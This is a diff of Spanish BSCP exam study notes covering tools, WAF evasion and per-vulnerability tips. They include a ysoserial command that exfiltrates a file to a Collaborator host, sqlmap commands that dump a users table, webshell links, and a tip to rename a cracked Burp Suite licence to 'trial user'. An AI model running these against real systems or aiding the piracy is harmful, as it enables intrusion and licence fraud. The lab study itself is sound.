@@ -16,6 +16,16 @@ image:
 
 - BSCP
 
+## Licencia de Burp Suite Professional
+
+Para realizar el examen necesitamos una `licencia válida y activa de Burp Suite Professional`, tal como indica la [FAQ oficial del BSCP](https://portswigger.net/web-security/certification/frequently-asked-questions). Podemos disponer de una `licencia de pago`; PortSwigger también ofrece una `licencia oficial de prueba`, que podemos solicitar siguiendo su [documentación de instalación](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install). Si vamos a utilizar una prueba para el examen, debemos comprobar su `vigencia y las condiciones aplicables`; la FAQ no detalla expresamente este caso
+
+### Nota sobre versiones crackeadas
+
+En el loader `BurpLoaderKeygen`, el nombre predeterminado de la licencia es `h3110w0r1d`, escrito exactamente así, según el [código de KeygenForm.java](https://github.com/Pasanlaksitha/Decompiled-Burpsuit-Cracker/blob/main/com/burpsuitcrack/burploaderkeygen/KeygenForm.java)
+
+La indicación de estos apuntes para quienes usen esa versión crackeada es `cambiar el nombre de la licencia de h3110w0r1d a trial user` en el loader. Este cambio de nombre `no convierte la copia en una licencia oficial de prueba ni acredita que sea válida para el examen`; el requisito oficial sigue siendo disponer de una `licencia válida y activa`
+
 ## Proceso de certificación
 
 El examen sigue un proceso `similar` al de los `laboratorios de la Web Security Academy` y al del `examen de práctica`. Sin embargo, antes de poder realizarlo hay que pasar por un `proceso automatizado de verificación de identidad`
@@ -31,8 +41,6 @@ Para convertirse en `Burp Suite Certified Practitioner` hay que seguir estos pas
 4 - `Realizar el examen de certificación`
 
 5 - `Obtener los resultados`
-
-Es `necesario` disponer de una `suscripción a Burp Suite Professional` para poder `realizar el examen`
 
 ## ¿Cómo funciona el examen?
 
@@ -84,7 +92,7 @@ La `integridad` del examen es lo que lo hace tan `valioso`, por lo que existe un
 
 ## Requisitos del sistema
 
-Sistema operativo:
+### Sistema operativo
 
 - `MacOS X 10.5 o superior`
 
@@ -94,51 +102,17 @@ Sistema operativo:
 
 - `ChromeOS`
 
-Navegador:
+### Navegador
 
 - La `última versión` de `Google Chrome` (hay que `desactivar` el `bloqueador de pop-ups`)
 
-Hardware:
+### Hardware
 
 - `Ordenador de escritorio o portátil`
 
 - `Webcam integrada o externa`
 
 - `Micrófono integrado o externo`
-
-## Resolución de problemas
-
-Si damos con una `solución que no funciona como esperábamos`, podemos seguir estos consejos generales:
-
-- Si estamos `atacando al usuario víctima`, `probamos el ataque primero en nuestro propio navegador`. Prestamos `mucha atención a la secuencia de tráfico HTTP en Burp`
-
-- Si nuestra `solución está adaptada de un laboratorio de la Academy`, intentamos `analizar en qué se diferencia la aplicación respecto al laboratorio`
-
-- Intentamos `identificar las suposiciones que estamos haciendo` y `ponerlas a prueba`
-
-- Volvemos a `consultar el conjunto de habilidades que la certificación pretende demostrar`
-
-## Resultados
-
-Si `no hemos recibido los resultados tras 3-5 días laborables`, podemos `iniciar sesión en nuestra cuenta de PortSwigger` para `comprobar el estado del examen`. Nos `notificarán los resultados por correo electrónico`:
-
-- Si `aprobamos` el examen, recibiremos un `enlace a nuestro certificado por correo electrónico`
-
-- Si `suspendemos`, nos lo `comunicarán por correo electrónico` y nos `proporcionarán recursos y orientación` para ayudarnos a `preparar el reintento` de la certificación
-
-## Recursos
-
-`Recursos necesarios para completar el examen`:
-
-- botesjuan [https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git)
-
-- DingyShark [https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git)
-
-- Guía de ofuscación [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)
-
-- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)
-
-- Hacking Notes Jordan [https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide](https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide)
 
 ## Vulnerabilidades
 
@@ -167,7 +141,6 @@ Si `no hemos recibido los resultados tras 3-5 días laborables`, podemos `inicia
 | OAuth Vulnerabilities          |   ✔️    |   ✔️    |         |
 | File Upload Vulnerabilities    |         |         |   ✔️    |
 | JWT Attacks                    |   ✔️    |   ✔️    |         |
-|                                |         |         |         |
 
 ### Adicionales
 
@@ -186,31 +159,131 @@ Si `no hemos recibido los resultados tras 3-5 días laborables`, podemos `inicia
 | WebSocket Attacks | ✔️ | ✔️ |  |
 | Web LLM Attacks | ✔️ | ✔️ | ✔️ |
 
-## Vulnerabilidades por etapa en el examen
+### Vulnerabilidades por etapa en el examen
 
 En esta `imagen` podemos `ver las vulnerabilidades que hay por fase en el examen`
 
-![](/assets/img/Portswigger-Exam-Methodology/image_1.png)
+![Vulnerabilidades por etapa del examen BSCP](/assets/img/Portswigger-Exam-Methodology/image_1.png)
+
+## Recursos
+
+### Guías de estudio
+
+`Recursos necesarios para completar el examen`:
+
+- botesjuan [https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git)
+
+- DingyShark [https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git)
+
+- Guía de ofuscación [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)
+
+- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)
+
+- Hacking Notes Jordan [https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide](https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide)
+
+### Experiencias con la certificación
+
+- [BSCP и с чем его едят?](https://habr.com/ru/articles/902466/) — Artículo en ruso sobre la experiencia con la certificación BSCP
+
+- [BSCP в 2025](https://habr.com/ru/articles/873672/) — Artículo en ruso sobre la preparación y la experiencia con el BSCP
+
+### Cheatsheets y diccionarios
+
+- [XSS Cheat Sheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — Referencia para preparar pruebas de XSS y consultar etiquetas y atributos
+
+- [SQL Injection Cheat Sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) — Sintaxis de referencia para adaptar las pruebas al motor de base de datos
+
+- [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table) — Tabla de consulta para pruebas de SSTI
+
+- [Funciones PHP peligrosas](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720) — Referencia de funciones que conviene revisar al analizar código PHP
+
+- [Diccionarios de loxs](https://github.com/coffinxp/loxs/tree/main/payloads) — Payloads de referencia para XSS, LFI y otras pruebas
+
+- [Laboratorios de SQLI resueltos](https://justice-reaper.github.io/categories/sqli/) — Explicaciones y scripts de Python que podemos adaptar a los laboratorios
+
+## Herramientas
+
+Conviene `preparar y probar las herramientas antes del examen` y `habilitar las extensiones de Burp Suite necesarias en cada fase`. Esta selección complementa el post de [Hacking Tools](https://justice-reaper.github.io/posts/Hacking-Tools/)
+
+### Herramientas de escaneo e inyecciones
+
+| Herramienta | Utilidad |
+| --- | --- |
+| Burp Suite Professional | Escanear páginas e insertion points seleccionados y analizar las peticiones y respuestas |
+| [Collaborator Everywhere](https://github.com/PortSwigger/collaborator-everywhere-v2) | Incorporar pruebas con Collaborator para detectar interacciones fuera de banda |
+| [Backslash Powered Scanner](https://github.com/PortSwigger/backslash-powered-scanner) | Buscar posibles puntos de inyección |
+| [Error Message Checks](https://github.com/PortSwigger/error-message-checks) | Detectar de forma pasiva mensajes de error del servidor |
+| [Active Scan ++](https://github.com/PortSwigger/active-scan-plus-plus) | Ampliar las comprobaciones del escáner activo de Burp Suite |
+| [Command Injection Attacker](https://github.com/PortSwigger/command-injection-attacker) | Generar payloads para pruebas de inyección de comandos |
+| [Agartha](https://github.com/PortSwigger/agartha) | Generar payloads para RCE, LFI y SQLI y apoyar las pruebas de control de acceso |
+
+`Agartha queda pendiente de probar en nuestro entorno`. Si no funciona como esperamos, podemos recurrir al `escáner de Burp Suite`
+
+### Herramientas de SQLI
+
+| Herramienta | Utilidad |
+| --- | --- |
+| [sqlmap](https://github.com/sqlmapproject/sqlmap) | Automatizar pruebas de SQLI y la extracción de datos |
+| Ghauri | Alternativa para las pruebas de SQLI; más abajo se incluye un ejemplo de uso |
+
+### Herramientas de HTTP, cabeceras y caché
+
+| Herramienta | Utilidad |
+| --- | --- |
+| [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) | Apoyar las pruebas de HTTP Request Smuggling |
+| [Host Header Inchecktion](https://github.com/PortSwigger/host-header-inchecktion) | Buscar vulnerabilidades relacionadas con la cabecera Host |
+| [CORS* - Additional CORS Checks](https://github.com/PortSwigger/additional-cors-checks) | Añadir comprobaciones de CORS |
+| [Content Type Converter](https://github.com/PortSwigger/content-type-converter) | Convertir el formato del cuerpo de las peticiones y su Content-Type |
+| [Diff Hunter](https://github.com/Justice-Reaper/Diff-Hunter) | Comparar peticiones y respuestas HTTP para identificar diferencias durante las pruebas |
+
+### Herramientas de JWT
+
+| Herramienta | Utilidad |
+| --- | --- |
+| [JWT Editor](https://github.com/PortSwigger/jwt-editor) | Crear y editar JWT, trabajar con firmas y cifrado y preparar pruebas sobre los tokens |
+| [JWT Scanner](https://github.com/PortSwigger/jwt-scanner) | Apoyar las comprobaciones de vulnerabilidades en JWT |
+
+### Herramientas de deserialización insegura
+
+| Herramienta | Utilidad |
+| --- | --- |
+| [ysoserial](https://github.com/frohoff/ysoserial) | Generar payloads para deserialización insegura de objetos Java |
+| [PHPGGC](https://github.com/ambionics/phpggc) | Consultar cadenas de gadgets y generar payloads de deserialización PHP |
+
+### Herramientas de subida de archivos
+
+| Herramienta | Utilidad |
+| --- | --- |
+| [Upload-Bypass de Justice-Reaper](https://github.com/Justice-Reaper/Upload-Bypass) | Generar diccionarios de nombres de archivo para probar restricciones de subida y disponer de webshells por lenguaje y archivos de ejemplo |
+| [Upload_Bypass de sAjibuu](https://github.com/sAjibuu/Upload_Bypass) | Probar técnicas para eludir restricciones en formularios de subida de archivos |
 
 ## Recomendaciones
 
-Si nos vamos a presentar al `BSCP`, tenemos que `tener en cuenta` lo `siguiente`:
+### Preparación y repaso de laboratorios
 
-- Necesitamos `conocer` bien la `estructura` del `repositorio` de `botesjuan` [https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git) y del `repositorio` de `DingyShark` [https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git)
+Si nos vamos a presentar al `BSCP`, tenemos que `conocer bien la estructura` de los repositorios de [botesjuan](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) y [DingyShark](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner)
 
-- `Hay escenarios que no están contemplados en ninguno de los repositorios anteriores`, para ello, `vamos a buscar lo que desconocemos en google`, por ejemplo: `bscp exam admin-panel/metrics/img%3Fimgname=1&dimensions="200x133!"`. Una vez hagamos esto, `nos vamos al modo IA` y `arriba a la derecha podemos ver las fuentes de donde se ha obtenido la información`. Es `recomendable` decirle que `busque más información` y que `nos diga las fuentes de donde la ha obtenido`
+Tenemos que `completar todos los laboratorios`, porque `pueden aparecer en el examen las mismas vulnerabilidades` o `pequeñas variaciones`. Para orientarnos sobre las vulnerabilidades de cada fase, podemos consultar las tablas y la imagen de la sección `Vulnerabilidades`. Son una `referencia de los apuntes`, no una distribución que debamos dar por segura en cada aplicación
 
-- Tenemos que `completa todos los laboratorios`, porque `pueden aparecer en el examen las mismas vulnerabilidades` o `que sea la misma vulnerabilidad pero con pequeñas variaciones`
+`Es recomendable tener los laboratorios hechos y subidos a una web o un blog para poder repasarlos`. También podemos consultar los laboratorios resueltos y explicados en [inglés por siunam321](https://siunam321.github.io/) y en [español por Justice-Reaper](https://justice-reaper.github.io)
 
-- `Para saber qué vulnerabilidades pueden aparecer en cada fase`, tenemos la `imagen` de la sección `Vulnerabilidades por etapa en el examen`. Es muy importante que la miremos, ya que son las `vulnerabilidades` que salen y `dónde están`. `La tabla no es perfecta, pero es muy fiel a lo que aparece`
+### Búsqueda de información y apoyo de IA
 
-- Nos conviene tener `Claude de pago` o `alguna otra IA` para que nos `ayude` a `bypassear` los `WAFS` y a `buscar información en los dos repositorios mencionados anteriormente`. Para buscar información, lo mejor es clonarlos e irle preguntando a la IA
+`Hay escenarios que no están contemplados en ninguno de los dos repositorios`. En ese caso, podemos buscar en Google utilizando `bscp exam` seguido de la `ruta o funcionalidad` que estamos investigando. Por ejemplo:
 
-- `Nos puede tocar una combinación de vulnerabilidades`. Por ejemplo, `en los laboratorios hay un documento XML con el que podemos explotar una SQLI` y en el `examen` a lo mejor `no es una SQLI`, sino que es un `command injection`. `Tenemos que tener esto en cuenta`
+```text
+bscp exam admin-panel/metrics/img%3Fimgname=1&dimensions="200x133!"
+```
 
-- `Para la vulnerabilidad HTTP Request Smuggling`, es recomendable `preparamos las peticiones`, porque salen `variaciones`, por ejemplo, `en el laboratorio en el que hay un XSS en el User-Agent`, en vez de un `HTTP request smuggling CL.TE`, nos puede salir un `HTTP request smuggling TE.CL`. Es decir, `nos tenemos que preparar las peticiones de los laboratorios más las variaciones de estas`
+Si usamos el `modo IA`, conviene `consultar las fuentes de la respuesta` y pedir que `amplíe la búsqueda e indique de dónde obtiene la información`
 
-`Todas las herramientas que podamos necesitar durante el examen están recopiladas en este post` [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/). `Tenemos que tener habilitadas las extensiones de Burpsuite necesarias en cada fase`
+Durante la `preparación con laboratorios`, podemos usar `Claude de pago u otra IA` para ayudarnos a `adaptar payloads a los WAF` y a `buscar información en los repositorios`. Para ello, conviene `clonar los repositorios de botesjuan y DingyShark` y aportar las `peticiones HTTP` para localizar `payloads y vulnerabilidades que puedan encajar`. Hay que `comprobar las propuestas y adaptarlas al comportamiento de la aplicación`
+
+### Variaciones de los laboratorios
+
+`Nos puede tocar una combinación de vulnerabilidades`. Por ejemplo, `en los laboratorios hay un documento XML con el que podemos explotar una SQLI` y en el `examen` a lo mejor `no es una SQLI`, sino un `command injection`. Tenemos que analizar el comportamiento de la aplicación y adaptar las pruebas
+
+### WAF y codificación de payloads
 
 Antes de `utilizar` la `IA` para `encodear caracteres`, vamos a probar estas cosas:
 
@@ -224,6 +297,125 @@ Antes de `utilizar` la `IA` para `encodear caracteres`, vamos a probar estas cos
 
 Para más `técnicas de ofuscación` con las que `evadir el WAF`, podemos `consultar la guía de ofuscación` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/) o simplemente hacer que la `IA` la `lea` y `nos genere los encodings correctos`
 
-`Es recomendable tener los laboratorios hechos y subidos a una web, un blog para poder repasarlos`. Si no queremos, `tenemos todos los laboratorios resueltos y explicados` en `inglés` aquí [https://siunam321.github.io/](https://siunam321.github.io/) y en `español` aquí [https://justice-reaper.github.io](https://justice-reaper.github.io)
+### Entorno de trabajo
 
-Tenemos que `evitar` que el `tráfico de snoopervisor.net` pase por `Burp Suite`, porque si no `nos petará Burp Suite en segundos`. `Una forma fácil de hacerlo es usar Chromium para el proceso de verificación de identidad y Google Chrome para completar el examen` 
+Tenemos que `evitar` que el `tráfico de snoopervisor.net` pase por `Burp Suite`, porque si no `nos petará Burp Suite en segundos`. `Una forma fácil de hacerlo es usar Chromium para el proceso de verificación de identidad y Google Chrome para completar el examen`
+
+## Notas prácticas por vulnerabilidad
+
+### XSS
+
+Conviene `crear un diccionario propio con los payloads utilizados en los laboratorios` y usar los [payloads de loxs](https://github.com/coffinxp/loxs/tree/main/payloads) como referencia para las `pruebas manuales`. Tenemos que `adaptar cada payload al contexto de inyección`
+
+También conviene preparar, en los laboratorios, `varias variantes de payloads de exfiltración de cookies de sesión`, ya que un `WAF puede bloquear determinados caracteres`. Así podemos escoger una base que encaje con el contexto y adaptar su codificación
+
+Podemos `guardar esas variantes en una lista` y usar `Claude u otra IA durante la preparación` para ayudarnos a adaptarlas a los caracteres permitidos, comprobando después su funcionamiento en el laboratorio
+
+La [XSS Cheat Sheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) nos sirve para seleccionar las `etiquetas y los atributos` que queremos probar. Podemos usar estas plantillas y `sustituir FUZZ por cada candidato`
+
+Para probar `etiquetas`, sustituimos las dos apariciones de `FUZZ` por la misma etiqueta:
+
+```html
+<FUZZ>testing</FUZZ>
+```
+
+Para probar `atributos`, usamos como base una etiqueta aceptada por el filtro y sustituimos `FUZZ` por el atributo:
+
+```html
+<test FUZZ=test></test>
+```
+
+### SQLI
+
+Podemos probar `sqlmap` y `Ghauri`. Los siguientes comandos proceden de un escenario de laboratorio con `PostgreSQL`; tenemos que `sustituir LAB-ID y SESSION_COOKIE` por los valores del laboratorio y `adaptar los parámetros y el motor` al caso que estemos analizando. El `asterisco` marca el punto de inyección que queremos probar
+
+Prueba con `sqlmap` sobre el parámetro `order`:
+
+```bash
+sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC*&BlogArtist=' \
+    --cookie='session=SESSION_COOKIE' \
+    --risk=3 --level=5 --random-agent --batch --dbms=PostgreSQL
+```
+
+Prueba con `Ghauri` para obtener la base de datos actual:
+
+```bash
+ghauri -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test*&organize=5*&order=ASC*&BlogArtist=*' \
+    --cookie='session=SESSION_COOKIE' \
+    --level=3 --random-agent --batch --current-db --dbms=PostgreSQL
+```
+
+En el ejemplo de los apuntes se utilizó `public` y la tabla `users` como objetivo de extracción. `No debemos asumir que esos nombres serán iguales en todas las aplicaciones`; primero comprobamos la estructura y después limitamos la extracción a los datos que necesitemos
+
+```bash
+sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC*&BlogArtist=' \
+    --cookie='session=SESSION_COOKIE' \
+    --risk=3 --level=5 --random-agent --batch --dbms=PostgreSQL \
+    -D public -T users --columns --dump
+```
+
+Si las herramientas no funcionan, podemos pasar a `pruebas manuales` con la [SQL Injection Cheat Sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) y adaptar los [scripts de Python de los laboratorios de SQLI](https://justice-reaper.github.io/categories/sqli/). Durante la preparación, también podemos pedir ayuda a la IA para `adaptar la sintaxis del payload al motor y al contexto de la inyección`
+
+### Deserialización insegura
+
+Para `Java`, podemos preparar payloads con `ysoserial`; para `PHP`, tenemos `PHPGGC`. La cadena de gadgets y el formato del payload deben `coincidir con las librerías y el procesamiento de la aplicación`
+
+Este ejemplo de laboratorio usa `Java 8` y `CommonsCollections2`, comprime el resultado con `gzip`, lo codifica en `Base64` y finalmente aplica `URL encoding`. Tenemos que `adaptar la ruta de Java y de ysoserial-all.jar` y sustituir `COLLABORATOR-ID` por nuestro identificador de Collaborator
+
+```bash
+/usr/lib/jvm/java-8-openjdk/bin/java -jar ysoserial-all.jar CommonsCollections2 \
+    '/usr/bin/wget --post-file /home/carlos/secret https://COLLABORATOR-ID.oastify.com/' \
+    | gzip \
+    | base64 -w0 \
+    | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))'
+```
+
+El comando generado intenta `enviar el contenido de /home/carlos/secret a Collaborator`. Esta secuencia de compresión y codificación solo encaja si la aplicación `espera y procesa ese formato`
+
+### Web Cache Poisoning
+
+Si nos atascamos en las pruebas de `Web Cache Poisoning`, podemos usar [Diff Hunter](https://github.com/Justice-Reaper/Diff-Hunter) para `comparar peticiones y respuestas` e investigar diferencias que hayan pasado desapercibidas al trabajar con `Param Miner`
+
+### File Upload
+
+Para probar restricciones de subida, podemos usar [Upload_Bypass de sAjibuu](https://github.com/sAjibuu/Upload_Bypass). Si necesitamos `variaciones de nombres de archivo y diccionarios de bypass`, podemos prepararlos con [Upload-Bypass de Justice-Reaper](https://github.com/Justice-Reaper/Upload-Bypass)
+
+Tenemos que `adaptar cada prueba a la restricción observada` y comprobar cómo procesa el servidor el `nombre, la extensión, el Content-Type y el contenido del archivo`
+
+### LFI y Path Traversal
+
+Para pruebas como `LFI`, podemos consultar los [diccionarios de loxs](https://github.com/coffinxp/loxs/tree/main/payloads), pero conviene `evitar lanzar payloads de forma indiscriminada`. Primero usamos el `escáner de Burp Suite sobre puntos seleccionados` y después probamos las `variaciones y codificaciones` que encajen con el filtro observado
+
+Si el WAF bloquea una palabra o un carácter, podemos probar `URL encoding o doble URL encoding`, aplicándolo únicamente a la parte del payload que dé problemas
+
+### HTTP Request Smuggling
+
+Es recomendable `preparar las peticiones de los laboratorios y sus variaciones`. Por ejemplo, en un escenario con `XSS en el User-Agent`, podemos encontrarnos con `HTTP Request Smuggling TE.CL` en lugar del `CL.TE` utilizado en el laboratorio. Podemos apoyar las pruebas con `HTTP Request Smuggler`
+
+### SSTI
+
+Para las pruebas de `SSTI`, podemos consultar la [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table)
+
+### Revisión de código PHP
+
+Si tenemos código `PHP` disponible, la lista de [funciones PHP peligrosas](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720) nos sirve como apoyo para revisar operaciones relevantes
+
+## Resolución de problemas
+
+Si damos con una `solución que no funciona como esperábamos`, podemos seguir estos consejos generales:
+
+- Si estamos `atacando al usuario víctima`, `probamos el ataque primero en nuestro propio navegador`. Prestamos `mucha atención a la secuencia de tráfico HTTP en Burp`
+
+- Si nuestra `solución está adaptada de un laboratorio de la Academy`, intentamos `analizar en qué se diferencia la aplicación respecto al laboratorio`
+
+- Intentamos `identificar las suposiciones que estamos haciendo` y `ponerlas a prueba`
+
+- Volvemos a `consultar el conjunto de habilidades que la certificación pretende demostrar`
+
+## Resultados
+
+Si `no hemos recibido los resultados tras 3-5 días laborables`, podemos `iniciar sesión en nuestra cuenta de PortSwigger` para `comprobar el estado del examen`. Nos `notificarán los resultados por correo electrónico`:
+
+- Si `aprobamos` el examen, recibiremos un `enlace a nuestro certificado por correo electrónico`
+
+- Si `suspendemos`, nos lo `comunicarán por correo electrónico` y nos `proporcionarán recursos y orientación` para ayudarnos a `preparar el reintento` de la certificación
